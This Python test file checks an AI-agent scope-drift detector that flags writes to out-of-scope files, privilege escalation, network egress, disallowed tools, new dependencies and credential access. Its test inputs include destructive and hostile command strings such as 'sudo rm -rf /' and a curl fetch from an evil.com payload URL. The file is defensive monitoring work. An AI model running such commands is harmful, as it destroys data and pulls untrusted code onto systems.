"""Tests for task boundary engine — scope drift detection."""

from uuid import uuid4

from agenttrace.models.task_contract import DriftType, RiskLevel, TaskContract
from agenttrace.graph.task_boundary import TaskBoundaryEngine


class TestTaskBoundary:
    """Tests for TaskBoundaryEngine."""

    def _make_engine(
        self,
        allowed: list[str] | None = None,
        prohibited: list[str] | None = None,
        tools: list[str] | None = None,
    ) -> TaskBoundaryEngine:
        contract = TaskContract(
            session_id=uuid4(),
            goal="Test task",
            allowed_paths=allowed or [],
            prohibited_paths=prohibited or [],
            allowed_tools=tools or [],
        )
        return TaskBoundaryEngine(contract)

    def test_allowed_file(self) -> None:
        engine = self._make_engine(allowed=["src/*"])
        result = engine.check_file_mutation("src/main.py", "modify")
        assert result is None  # No drift

    def test_prohibited_file(self) -> None:
        engine = self._make_engine(prohibited=[".env"])
        result = engine.check_file_mutation(".env", "modify")
        assert result is not None
        assert result.drift_type == DriftType.FILE_OUTSIDE_SCOPE

    def test_outside_scope_file(self) -> None:
        engine = self._make_engine(allowed=["src/*"])
        result = engine.check_file_mutation("config/secrets.yaml", "modify")
        assert result is not None
        assert result.drift_type == DriftType.FILE_OUTSIDE_SCOPE

    def test_destructive_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("rm -rf /important")
        assert any(r.drift_type == DriftType.DESTRUCTIVE_OPERATION for r in results)

    def test_privilege_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("sudo apt install malware")
        assert any(r.drift_type == DriftType.PRIVILEGE_ESCALATION for r in results)

    def test_network_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("curl https://evil.com/payload")
        assert any(r.drift_type == DriftType.NETWORK_EGRESS for r in results)

    def test_disallowed_tool(self) -> None:
        engine = self._make_engine(tools=["python", "pytest"])
        results = engine.check_command("npm install evil-package")
        assert any(r.drift_type == DriftType.SEMANTIC_DRIFT for r in results)

    def test_dependency_change(self) -> None:
        engine = self._make_engine()
        result = engine.check_dependency_change(
            "package.json",
            '{"dependencies": {}}',
            '{"dependencies": {"evil": "1.0"}}',
        )
        assert result is not None
        assert result.drift_type == DriftType.UNEXPECTED_DEPENDENCY

    def test_credential_access(self) -> None:
        engine = self._make_engine()
        result = engine.check_credential_access("password = 'hunter2'")
        assert result is not None
        assert result.drift_type == DriftType.CREDENTIAL_ACCESS

    def test_risk_evaluation(self) -> None:
        engine = self._make_engine()
        # No drifts = LOW risk
        assert engine.evaluate_risk([]) == RiskLevel.LOW

        # Critical drift
        results = engine.check_command("sudo rm -rf /")
        risk = engine.evaluate_risk(results)
        assert risk == RiskLevel.CRITICAL
